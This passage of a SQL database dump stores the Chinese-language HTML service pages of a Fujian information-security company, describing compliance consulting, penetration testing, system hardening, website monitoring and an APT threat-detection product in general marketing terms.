src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">海峡信息等保咨询服务从安全管理和安全技术两大方面的十个控制类中进行等级保护建设和整改咨询服务，海峡信息把等级保护建设过程分解为4个子服务：</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">等级保护建设差距分析服务</span></p><p class=\"publicp\">等级保护建设项目首先要进行重要信息系统的定级和备案工作。然后针对定级备案系统所在的网络环境开展资产整理、风险评估、渗透测试等工作，以分析信息系统当前风险状况，以明确等级保护整改需求和重点。差距分析服务会输出等级保护需求分析、方案设计、项目规划、安全措施选择与选型等内容，等级保护差距分析服务是等级保护整改与加固的基础，也可以单独购买。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">等级保护安全整改与加固服务阶段</span></p><p class=\"publicp\">等级保护安全加固服务包括重要信息系统相关的网络结构化设计，网络设备安全防护加固，服务器主机安全加固，数据库系统安全加固，中间件系统安全加固，应用服务漏洞检测与加固服务等加固工作。安全加固服务能够有效的加强等级保护的网络安全设备防护、主机安全的大部分控制点以及应用安全漏洞修复方面起到重要作用。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">等级保护测评辅助服务阶段</span></p><p class=\"publicp\">重要信息系统整改完毕后，执行一次完整的等级保护差距复查服务，按照等级保护基本要求和等级保护测评准则实施自我预测评工作，并根据测评结果弥补缺漏，为申请测评做准备。测评辅助服务还包括在等级保护测评前，海峡信息协助用户完成等级保护的重要信息系统的定级和备案工作。在等级保护测评过程中，海峡信息协助用户为测评机构提供测评数据，辅助测评工作的顺利开展。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">等级保护管理体系建设服务阶段</span></p><p class=\"publicp\">根据等级保护安全管理基本要求，为重要信息系统建立起信息安全策略、方针、各项安全管理制度、安全操作规范以及各类操作记录文档体系，使信息化管理能够在等级保护要求的管理体系下长期稳定运行。</p><p class=\"publicp\">以上4个服务包构成海峡信息等级保护咨询一站式服务，也可以根据实际情况选用。海峡信息一站式安全服务如下图所示：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958f73b0826e.PNG\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 为什么选择海峡信息：</h1><p class=\"publicp\">（1）丰富的经验：海峡信息作为福建省唯一以信息安全为主营业务的企业，参与大量等级保护相关研究和实践工作；</p><p class=\"publicp\">（2）专业的团队：经验丰富的专业服务人员，规范化的服务交付能力；</p><p class=\"publicp\">（3）深厚的资质：福建省卫生行业信息安全等级保护专家组中唯一的一个企业化单位。</p><h1 class=\"publicSecTitle cg\"><img src=\"/uploads/img1/20170702/5958edcaaaf99.png\"/> 典型案例：</h1><p class=\"publicp cg\">1.已经通过等级保护测评的客户信息系统：</p><p class=\"publicp cg\">科技厅科技项目管理系统、台湾文献信息系统、农业厅外网网站系统、五有系统、公务员局公务员招考系统、福州海关运行网信息系统</p><p class=\"publicp cg\">2.服务中的三级系统：</p><p class=\"publicp cg\">政务外网云计算平台、福建省附属第一医院信息系统、、福建省中山医院信息系统、福建省财政厅、福建省立医院、龙岩市第一医院、厦门大学附属第一医院、福建协和医院</p>');
INSERT INTO `xyh_sever` VALUES ('6','90','渗透测试服务','<p class=\"publicp\">我一直认为，如果你暴露出一点弱点，那应该是一件好事情——Janet Reno</p><p class=\"publicp\">如果可以被证明是安全的，那么也有可能不是安全的——Lars Knudsen</p><p class=\"publicp\">渗透测试是一种全新的安全防护思路，将安全防护从被动转换成了主动。正是因为看到了这一点，很多重点行业的企业越来越多地通过独立的第三方安全机构来进行“渗透测试”，以求更好的安全防护效果。</p><p class=\"publicp\">随着电子商务、电子政务的发展，越来越多重点单位和企业在安全上投入了巨大的精力和资金，但有时候用户会有这样的感受：当基本的软硬件设施配置好之后，安全防卫水平就到了一个相对的瓶颈，再加大投入并不能明显提高安全水平。实际上，这种“安全玻璃天花板”在很多行业和企业中都存在，而“渗透测试” 成为了解决这个问题的新角度之一。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户需求：</h1><p class=\"publicp\">（1）自动化扫描可能存在误报或是漏报；</p><p class=\"publicp\">（2）自动化扫描可能很全面，但是却不够深入；</p><p class=\"publicp\">（3）急需一种辅助的方法与自动化扫描相结合，更好的评估系统。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">渗透测试为纯人工的安全漏洞挖掘过程，通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种服务。在该过程中，海峡信息安全研究专家通过其已经掌握的攻击方法，对系统的任何弱点、技术缺陷和漏洞进行全面、深入和扩大化的主动分析。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">测试方法</span></p><p class=\"publicp\">黑箱测试：完全模拟黑客的入侵方式来进行渗透测试</p><p class=\"publicp\">白盒测试：测试者可以通过正常渠道向被测单位取得各种资料来进行渗透测试</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">渗透目标</span></p><p class=\"publicp\">操作系统渗透：对Windows、Solaris、AIX、Linux、等操作系统本身进行渗透测试。</p><p class=\"publicp\">数据库系统渗透：对MS-SQL、Oracle、MySQL、等数据库应用系统进行渗透测试。</p><p class=\"publicp\">应用系统渗透： 对渗透目标提供的各种应用，如ASP、CGI、JSP、PHP等组成的WWW应用进行渗透测试。</p><p class=\"publicp\">网络设备渗透： 对各种防火墙、入侵检测系统、网络设备进行渗透测试。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户价值：</h1><p class=\"publicp\">（1）深度挖掘计算机网络系统中的安全漏洞，并判断漏洞可能造成的最大限度的损失；</p><p class=\"publicp\">（2）以最真实的测试方法，让客户体验计算机网络系统遭受黑客入侵时的措手不及，以便及早防护；</p><p class=\"publicp\">（3）以最权威的客户数据，让客户感受计算机网络系统安全漏洞将带来的影响和损失，以便做好安全损失与保护的评估。</p>');
INSERT INTO `xyh_sever` VALUES ('7','91','安全加固优化服务','<p class=\"publicp\">他们总是试图从内部和外部的黑暗中逃避出来。梦想系统足够完美，以至于没有人能做成坏事——TS Eliot</p><p class=\"publicp\">由于功能复杂，代码庞大，计算机操作系统、数据库系统在设计上存在一些安全漏洞和一些未知的“后门”，一般情况下很难发现，同时由于系统的配置不当也会带来 安全隐患，是黑客攻击得手的关键因素。因此，信息系统在投入使用前和使用中，都需要对操作系统、数据库系统等进行安全加固，以提高系统安全防范能力，减少安全事件的发生。</p><p class=\"publicp\">安全加固是配置软件系统的过程，针对服务器操作系统、数据库及应用中间件等软件系统，通过打补丁、强化帐号安全、加固服务、修改安全配置、优化访问控制策 略、增加安全机制等方法，堵塞漏洞及“后门”，合理进行安全性加强，提高其健壮性和安全性，增加攻击者入侵的难度，软件系统安全防范水平得到大幅提升。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户需求：</h1><p class=\"publicp\">（1）为什么针对信息业务系统入侵事件频繁发生？</p><p class=\"publicp\">（2）为什么信息业务系统恢复后威胁仍然存在？</p><p class=\"publicp\">（3）为什么已经部署了安全设备但被黑事件还会出现？</p><p class=\"publicp\">（4）如何全面了解企业信息业务系统安全脆弱性状况？</p><p class=\"publicp\">（5）如何建立完善的安全加固机制？</p><p class=\"publicp\">（6）通过什么方法去发现和修补这些风险和漏洞？</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">海峡信息安全研究团队具有专业的网络策略研究、操作系统安全、数据库安全、Web应用安全相关的专业技术人员，能够协助用户在风险可控的条件下对信息系统开展安全加固和安全优化服务。流程图如下所示：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958fa3994858.png\"/></p><p class=\"publicp\">具体实例如图：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958fa5abff1d.PNG\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户价值：</h1><p class=\"publicp\">（1）提升信息系统安全防护水平；</p><p class=\"publicp\">（2）堵塞漏洞减少网络攻击安全事件；</p><p class=\"publicp\">（3）防止系统入侵安全隐患再次被黑客利用；</p><p class=\"publicp\">（4）避免企业再次遭受黑客入侵的安全威胁；</p><p class=\"publicp\">（5）帮助企业客户建立完善的安全加固机制；</p><p class=\"publicp\">（6）最大限度降低信息安全运维成本。</p>');
INSERT INTO `xyh_sever` VALUES ('8','92','安全监控服务','<p class=\"publicp\">一次是偶然，两次是巧合，但三次就是敌对的攻击了——Goldfinger</p><p class=\"publicp\">网站安全监测服务是为了完善WEB应用安全保障机制而存在的。通过网站安全监测服务与现有的WEB应用安全防护技术、防护产品、安全策略有机的整合，从而形成长效的WEB应用安全保障机制。</p><p class=\"publicp\">现如今，web应用安全产品五花八门。但其产品尚不能完整的覆盖WEB应用安全的生命周期，当前的安全防护方案仍缺少一套行之有效的长效安全保障措施。网站安全监测服务则是 为了完善WEB应用安全保障机制而存在的。通过网站安全监测服务与现有的WEB应用安全防护技术、防护产品、安全策略有机的整合，从而形成长效的WEB应用安全保障机制。网页挂马、SQL注入攻击和 XSS 跨站脚本攻击已经成为木马、病毒传播的主要途径之一。由于各种系统漏洞和软件漏洞的存在，因此通过入侵进行挂马的数量会继续增加。同时黑客通过SQL注入攻击或 XSS 跨站脚本攻击等手法入侵网站系统，从而篡改网站网页或数据库的内容，甚至植入各种各样的下载脚本代码。用户只要浏览被植入木马的网站，如果用户的操作系统存在漏洞就会遭遇木马入侵，从而造成个人信息泄露和财产损失。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户需求：</h1><p class=\"publicp\">（1）实时远程安全监控服务，在第一时间检测到网站的安全问题</p><p class=\"publicp\">（2）无需安全任何软件或调整网络架构，无需购买和部署设备，在几小时内就可以检测服务投入运行</p><p class=\"publicp\">（3）专业的技术指导协助我及时消除安全威胁</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">7*24小时不间断的风险检测能力、检测平台与安全专家的有效整合、与现安全产品的无缝融合</p><p class=\"publicp\">海峡信息网站安全监控系统，旨在帮助政府、企业和关注WEB安全的机构组织大规模、周期性检测网站已有的安全漏洞和安全隐患，使用户深入了解网站的安全现状和安全发展趋势，帮助用户在网站系统被恶意入侵前有效地对薄弱环节进行有针对性的修补。</p><p class=\"publicp\">海峡信息网站监控系统总体框架示意图：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170702/5958fb5d69966.PNG\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户价值：</h1><p class=\"publicp\">海峡安全监测服务平台用于对广大用户群体提供远程安全监测服务。用户无需安装任何软件或调整网络架构，由于无需购买和部署设备，因此用户可以在几个小时内将监测服务投入运行，海峡信息将在第一时间将监测到的网站安全问题及时通报给用户，并给予专业的技术指导协助用户及时消除安全威胁。</p>');
INSERT INTO `xyh_sever` VALUES ('9','94','安全咨询服务','<p class=\"publicp\">兵者，诡道也……利而诱之，乱而取之——孙武《孙子兵法》</p><p class=\"publicp\">随着社会信息化程度越来越高，企业的生存和发展越来越依赖于多方面的信息技术以及对信息技术的管理。信息技术的管理涉及信息安全管理体系咨询、IT治理、IT内部控制、IT规划、信息安全风险评估、业务连续性、IT服务管理、开发安全和运维等多方面领域。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 服务介绍：</h1><p class=\"publicp\">海峡信息基于自有知识产权的IT风险管理与控制框架，结合对信息技术与信息安全相关标准/模型/规范的深刻理解，为客户提供一系列信息科技风险咨询服务，说明客户逐步将管理流程融入到日常行为中，更加有效地发挥管理体系的作用，并协助企业主动识别改进机会，持续提升管理体系价值。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 客户价值：</h1><p class=\"publicp\">（1）从外部审视企业，全面了解企业安全现状</p><p class=\"publicp\">（2）解决企业实际存在的安全问题</p><p class=\"publicp\">（3）增强企业抗击安全威胁的能力</p><p class=\"publicp\">（4）更新企业员工安全意识</p>');
INSERT INTO `xyh_sever` VALUES ('10','47','下一代应用威胁感知与防御解决方案','<h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 产品渊源：</h1><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">概述</span></p><p class=\"publicp\">随着网络与信息技术的发展，业务对信息和网络的逐渐依赖对社会的各行各业产生了巨大深远的影响，信息安全的重要性也在不断提升。网络安全事件的发展显示，骇客正在使用越来越精密且有效率的方式来进行攻击。</p><p class=\"publicp\">APT攻击在21世纪开始蓬勃发展起来，有重要信息资产的部门都成为APT指向的目标。2010年的Google Aurora(极光)攻击是一个十分著名的APT攻击，Google的一名雇员点击即时消息中的一条恶意链接，引发了一系列事件导致这个搜索引擎巨人的网络被渗入数月，并且造成各种系统的数据被窃取。2011年3月，EMC公司下属的RSA公司遭受入侵，部分SecurID技术及客户资料被窃取，其后果导致很多使用SecurID作为认证凭据建立VPN网络的公司——包括洛克希德马丁公司、诺斯罗普公司等美国国防外包商——受到攻击，重要资料被窃取。APT攻击已成为最具威胁性的信息安全攻击手段。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">网络安全面临变革</span></p><p class=\"publicp\">伴随着APT攻击造成的重大损失的同时，是传统安全监测与防御手段针对APT攻击的无能为力。从国家级的核设施网络到美国NASA，从世界互联网巨头GOOGLE到安全公司翘楚RSA，无一不是APT攻击的受害者。如果说他们的安全做的不好，那世界上又有几家能说比他们的安全做的更好呢？APT剑指之下，没有那个部门能幸免。试想一下，当攻击者可以肆意进出和控制军事指挥系统、核系统、能源系统、交通指挥系统、金融系统，那么除了信息的安全，我们实体的财产与生命安全，也将变得无比脆弱。在传统的企业安全防御系统中，IDS、IPS、防火墙、安全网关等安全产品并非针对APT的检测、防护而生。所以，原有的防护系统在APT攻击面前起到的作用非常之小。如何在新旧技术交叠应用的变革过程中，更有效地检测和防御系统网络面临的安全问题，已成为各方关注的重点。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">什么是APT攻击</span></p><p class=\"publicp\">APT攻击是指容和情报、黑客技术、社会工程等各种手段，针对有价值的信息资产或通过IT系统控制的重要系统，发起复杂而专业的攻击。由于IT系统复杂性，目前还没有很好的检测措施完全发现IT产品中的后门、漏洞以及应用运行时的可信性。</p><p class=\"publicp\">APT攻击从渗透进内网到窃取高价值信息，是一种多阶段多维度的过程。攻击者通过混合了基于网页、邮件和文档的多种攻击技术，让APT攻击变得难以感知。整个APT攻击过程可归纳为情报收集阶段、攻击阶段、控制阶段和内部扩散阶段四个阶段，下图为APT攻击流程示意图：</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/59599c4be4c03.png\"/></p><p class=\"publicp\">目前我们仍在使用 的Firewall、IPS、IDS、AV、上网行为管理、DLP都不具备相应的能力可以检测到利用了ODAY、变形木马的APT攻击，存在着“未知攻，焉知防”的尴尬。APT攻击之所以能无往而不利，因为传统的安全技术主要是依靠静态签名或者是基于特征匹配的检测原理。我们来看看APT是如何对抗传统安全技术：</p><p class=\"publicp\">(1)防火墙：防火墙通常允许HTTP流量，下一代防火墙强调了对用户和应用程序的控制。下一代防火墙虽然包含了IPS、AV、应用控制、流量控制等新功能，但依然使用的是传统的安全检测引擎，所以仍然无法使得防火墙具备检测APT攻击的能力。</p><p class=\"publicp\">(2)IDS、IPS:基于静态签名的检测、包检査、DNS分析依然对使用ODAY漏洞利用技术的APT攻击是无感知的。</p><p class=\"publicp\">(3)反垃圾邮件：钓鱼网站经常使用动态域名和URL，而反垃圾邮件的黒名单的更新往往是滞后，有数据显示钓鱼网站被关闭前平均能存活26个小时。</p><p class=\"publicp\">(4)杀毒软件和防毒墙：因为恶意程序、漏洞是未知的，网站本身有好的信誉，杀软和 防毒墙不会对它们采取任何措施。</p><p class=\"publicp\">(5)上网行为管理：大多数出网过滤名单禁止的是成人和游戏网站，对其他类型网站很 少限制。另外动态URL、黑客自己建立的合法网站使得静态的URL过滤列表失去作用。</p><p class=\"publicp\">(6)DLP (数据防泄漏）：DLP关心的是用户个人信息，比如密码、银行帐号等私密信 息，但黒客在窃取信息后通常会做压缩和加密操作，然后再通过隐蔽信道发送出去，这些技 术手段都是DLP的检测机制无法感知的。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">需要什么样的网络安全威胁与防御产品</span></p><p class=\"publicp\">1.全方位的APT攻击检测</p><p class=\"publicp\">2.深度分析已知漏洞攻击和0day攻击</p><p class=\"publicp\">3.web、邮件、文件检测系统</p><p class=\"publicp\">4.关联分析能力强，快速识别APT攻击行为</p><p class=\"publicp\">5.直观展现APT攻击路径，安全威胁可视化</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 产品介绍：</h1><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">概述</span></p><p class=\"publicp\">APT攻击本身具有复杂性、隐蔽性、持续性等特点，这些特点导致了现有安全防御体系 在技术层面的对抗上就存在天然的缺陷，并且由于对APT攻击的认知不足，加剧了攻防之间的差距。黑盾安全威胁检测与防御系统（ 以下简称：“CCS-APT”）是福建海峡信息技术有限公司对信息安全十余年研究积累基础上，在针对APT攻击的这些特点深入研究后，投入巨资研发推出的、拥有自主知识产权的安全产品。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">设计理念</span></p><p class=\"publicp\">针对新一代的网络威胁的特点与特殊要求，CCS-APT基于如下理念而设计：\r\n黑盾安全威胁检测与防御系统设计目标旨在适应攻防的最新发展，准确监测网络异常流量，第一时间将安全威胁阻隔在企业网络外部。该产品弥补了防火墙、入侵检测等产品的不足，提供动态的、深度的、主动的安全防御，是对现有安全防御体系的很好补充。</p><p class=\"publicp\">APT攻击存在一个完整的生命周期，黑盾安全威胁检测与防御系统针对其整个生命周期里必须使用的技术点进行监控，提供了全方位的未知威胁分析：深度分析已知漏洞攻击和0day攻击，帮助用户发现真正的黑客攻击；通过web、邮件、文件检测系统的配合检测，全方位的发现APT攻击；关联分析能力强，快速识别APT攻击行为；直观展现APT攻击路径，安全威胁可视化。</p><p class=\"publicp\">同时，福建海峡信息技术有限公司提供高级分析服务，对于用户无法确定的攻击行为和攻击样本，可提供高级技术支持，协助用户对攻击进行分析，用以对抗高技术的黑客。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">技术优势</span></p><p class=\"publicp\">1）智能协议深度识别和分析</p><p class=\"publicp\">协议识别是新一代网络安全产品的核心技术。传统安全产品如防火墙，通过协议端口映射表（或类似技术）来判断流经的网络报文属于何种协议。</p><p class=\"publicp\">但是，事实上，协议与端口是完全无关的两个概念，我们仅仅可以认为某个协议运行在一个相对固定的缺省端口。包括木马、后门在内的恶意程序，以及P2P应用、IMS、网络在线游戏等应用都可以运行在任意一个指定的端口，从而逃避传统安全产品的检测和控制。</p><p class=\"publicp\">系统采用独有的智能协议深度识别技术，通过动态分析网络报文中包含的协议特征，发现其所在协议，然后递交给相应的协议分析引擎进行处理，能够在完全不需要管理员参与的情况下，高速、准确地检测出通过动态端口实施的恶意入侵，可以准确发现绑定在任意端口的各种木马、后门。</p><p class=\"publicp\">2）证据关联分析</p><p class=\"publicp\">利用对多种网络数据的智能协议深度解析和处理引擎，解读流量数据，不断跟踪、记录网络中的网络行为和事件，建立日常行为基准，形成独有的证据库。</p><p class=\"publicp\">通过对证据库进行大数据挖掘分析的基础上，匹配ARTsmart攻击链库，能够将事件从多角度进行智能关联分析，追踪源头，找出隐秘异常行为，发现安全威胁。用户可以通过上钻、下钻操作方式多角度了解攻击事件的流程，及时发现网络中的恶意行为、漏洞、以及攻击等安全隐患，将APT攻击消灭在萌芽期。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">产品主要功能介绍</span></p><p class=\"publicp\">1）维修检测功能</p><p class=\"publicp\">全方面的检测机制：从已知签名检测、无签名的深度内容检测、动态行为检测及事件关联分析等维度，对各类威胁进行深度检测并在漏洞利用、后门植入、窃密等攻击环节上形成纵深立体的检测体系。</p><p class=\"publicp\">全面覆盖威胁载体：拥有最新、最全的漏洞特征库，并采用第二代VM虚拟引擎技术，能够准确的检测出利用0Day和NDay漏洞攻击行为。</p><p class=\"publicp\">安全漏洞检测：针对网络中的URL、文档文件、可执行程序、邮件、网络通道、流量等威胁载体进行检 测，全面阻击APT可能存在的载体。</p><p class=\"publicp\">强大的入侵规则库：产品拥有强大的入侵检测规则库，十大类的规则分类包含超过40000条的规则，能够覆盖常用的攻击方法和漏洞，具有清晰明了的攻击划分和描述，能够识别各种黑客攻击或入侵的方法和手段，如扫描、后门、恶意代码、拒绝服务等。</p><p class=\"publicp\">热点攻击地图：系统为用户提供攻击事件的地理位置视图，全方位、快速、可视化的动态展示攻击事件的信息，帮助用户了解自身网络状态。</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/59599cd9629a0.png\"/></p><p class=\"publicp\">多种部署模式：系统提供了各种规模的系统全面检测功能，能够在一套解决方案中支持众多环境和众多协议的检测，通过网络旁路监听的方式接入网络，通过在核心交换机上设置端口镜像模式，使安全检测引擎能够监听到所有用户通过交换机进行通讯的所有操作。在实现监控检测功能的同时，完全不改变用户的网络环境，避免设备对用户网络造成中断的风险。用户可以根据需要将CCS-APT引擎安放在网络的不同位置，其典型的安装方式有：\r\n①	监控、检测内部网络中所有的网络连接和攻击行为。\r\n②	多路监控和检测外网对内网所做的攻击。</p><p class=\"publicp\">2）威胁管理功能</p><p class=\"publicp\">关联事件告警管理：事件查看提供了关联攻击事件的完整信息：攻击发生时间范围、事件名称、事件类别、关键IP、关联证据数、持续时间、攻击结果等。</p><p class=\"publicp\">多维度证据展示与统计：提供多维度证据展示与统计，包括证据分类、分层统计以及基于线性矩阵视角的敏感时段分割展示。</p><p class=\"publicp\">安全分析报告：系统定期自动生成安全分析报告，提供最近一周或最近一月时间范围内的监控记录分析以及结论，形成系统告警分析报告，以供分析了解网络安全状况。同时，报告支持WORD、HTML、PDF格式导出，方便用户离线查看或进行打印汇报。</p><p class=\"publicp\">丰富的响应方式：提供丰富的响应方式，包括：邮件报警、界面显示、日志数据库记录、windows消息、网关联动等，同时提供标准 syslog接口，可接受第三方管理平台的安全事件集中监控、报告和管理。</p><p class=\"publicp\">高级人工分析：为解决用户“设备报了警后，如何判断是真假？无法确定的攻击行为或样本？ ”等问题， CCS-APT提供高级分析服务，利用福建海峡信息技术有限公司专家团队，协助用户对攻击进行分析，确认样本的真实危害性，大大减轻用户的运维压力。</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 产品应用：</h1><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">部署方式</span></p><p class=\"publicp\">系统提供了各种规模的系统全面检测功能，能够在一套解决方案中支持众多环境和众多协议的检测，通过网络旁路监听的方式接入网络，通过在核心交换机上设置端口镜像模式，使安全检测引擎能够监听到所有用户通过交换机进行通讯的所有操作。在实现监控检测功能的同时，完全不改变用户的网络环境，避免设备对用户网络造成中断的风险。用户可以根据需要将CCS-APT引擎安放在网络的不同位置，其典型的安装方式有：\r\n①	监控、检测内部网络中所有的网络连接和攻击行为。\r\n②	多路监控和检测外网对内网所做的攻击。</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">监控、检测内部网络中所有的网络连接和攻击行为 </span></p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/59599e232af53.png\"/></p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">多路监控和检测外网对内网所做的攻击</span></p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/59599e2a0cf3f.png\"/></p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">用户价值</span></p><p class=\"publicp\">黑盾安全威胁检测与防御系统能全面感知APT攻击行为（如ODAY漏洞攻击、高级特马、隐蔽信道），将威胁行为可视化动态展示。通过对证据库进行大数据挖掘分析的基础上，匹配ARTsmart攻击链库，能够将事件从多角度进行智能关联分析，追踪源头，找出隐秘异常行为，发现安全威胁，及时发现网络中的恶意行为、漏洞、以及攻击等安全隐患，将APT攻击消灭在萌芽期。</p>');
INSERT INTO `xyh_sever` VALUES ('11','43','电子政务系统行业安全应用解决方案','<h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 背景与需求：</h1><p class=\"publicp\">电子政务是国家信息化服务能力的体现，是政府进行管理、决策和服务的重要手段。电子政务信息系统通过政务信息网、政务外网、政务专网和互联网提供服务，必然会遭遇来自恐怖集团、敌对势力、捣乱分子的安全威和网络攻击。伴随近年愈演愈烈的网络安全态势，承载着众多电子政务信息系统和政务数据、作为电子政务信息原点和数据交换平台的电子政务数据中心，面临着严峻的安全挑战。如何规划和建设安全的政务数据中心，成为电子政务建设工作中的难点课题。</p><p class=\"publicp\">数据中心作为电子政务信息原点和数据交换平台，网络系统覆盖范围大，涉及的用户面广，业务应用众多而且复杂，还需要与相关网络互联。因此，其可能面临多方面的信息安全技术风险，经过总结分析主要包括了以下几类：</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">网络安全风险</span></p><p class=\"publicp\">包括来自网络层拒绝服务攻击、网络嗅探伪造、网络蠕虫病毒、非授权的网络访问、非法接入和违规外联等安全问题带来的技术风险；</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">主机层安全风险</span></p><p class=\"publicp\">包括操作系统和数据厍的系统漏洞，系统软件的安全策略缺陷，违规特权操作、数据篡改、系统操作审计日志缺失、审计日志可读性差等问题带来的技术风险；</p><p class=\"publicp\"><img src=\"/uploads/img1/20170702/5958eb4222487.png\"/>&nbsp;<span style=\"color: rgb(79, 129, 189);\">主机层安全风险</span></p><p class=\"publicp\">包括应用系统软件漏洞，包括SQL注入、XSS跨站、Cookie注入、应用层拒绝服务CC攻击、网页篡改、暗链攻击、网站爬虫在内的黑客攻击，违规特权操作，数据篡改、系统操作审计日志缺失、审计日志可读性差等问题带来的技术风险；</p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 设计架构：</h1><p class=\"publicp\">海峡信息政务数据中心安全技术防护解决方案，是根据《国家电子政务总体框架》、《电子政务信息共享互联互通平台总体框架技术指南》和国家信息系统等级保护相关要求，结合海峡信息多年的行业经验形成的安全技术体系解决方案。</p><p class=\"publicp\">针对庞大而复杂的政务数据中心，首先进行安全区域设计，划分为：政务接入区、核心交换区、运维管理区、核心业务区、核心数据区等5大安全区域；进而从网络层、主机层、应用层等方面，设计各安全区域进行安全防护策略措施，达到整体统一的安全防护效果。</p><p style=\"text-align: center;\"><img src=\"/uploads/img1/20170703/5959953ac2111.jpg\"/></p><h1 class=\"publicSecTitle\"><img src=\"/uploads/img1/20170702/5958e983ec003.png\"/> 用户价值：</h1><p class=\"publicp\">海峡信息政务数据中心安全技术防护解决方案，以“ 分区分域纵深防御” 为核心，重点防护和保障政务数据中心的关键业务安全；</p><p class=\"publicp\">落实网络层、主机层、应用层、数据层和物理层五大层次的安全技术措施设计，从“访问控制”“入侵防范”“通信报密”“恶意代码防范” “篡改恢复” “安全审计”等方面，完善政务数据中心信息安全基础设施建设工作，做到“进不来”\r\n“拿不走”“看不懂”“改不了” “走不脱”；</p><p class=\"publicp\">能够有效满足政务数据中心的安全需求，符合等级保护标准和相关规范要求，动态感知数据中心安全态势，主动防御来自内外网络攻击，提升政务数据中心的安全防护能力。</p>');
